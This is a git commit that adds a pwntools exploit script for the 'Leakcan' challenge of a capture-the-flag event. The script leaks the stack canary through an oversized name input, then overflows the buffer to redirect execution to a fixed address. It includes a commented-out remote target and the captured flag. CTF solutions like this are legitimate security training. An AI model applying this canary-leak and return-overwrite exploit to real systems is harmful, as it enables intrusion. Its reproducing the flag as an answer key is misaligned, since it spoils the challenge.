cf4096fdffc46e0055ee21c78263b7584b197f2a
XinshengZhu <xinsheng.zhu.ny@gmail.com>
2025-04-13 15:06:41 -0400

    Add 1753CTF

---
+++ 1753CTF/Leakcan/leakcan.py
@@ -0,0 +1,26 @@
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+p = gdb.debug('./leakcan_chall', '''
+    b *0x4018a4
+    b *0x4018ea
+    b *0x401920
+    continue
+''')
+
+# p = remote('leakcan-25b8ac0dd7fd.tcp.1753ctf.com', 8435)
+
+p.recvuntil(b'What\'s your name?\n')
+p.sendline(b'A' * 0x58)
+p.recvuntil(b'Hello! ')
+canary_value = u64(b'\x00'+p.recv(0x60)[-7:])
+log.info(f'canary value: {hex(canary_value)}')
+
+p.sendline(b'A'*0x58+p64(canary_value)+p64(1)+p64(0x40194f))
+
+p.interactive()
+
+# 1753c{c4n4ry_1f_th3r35_4_m3m_l34k}
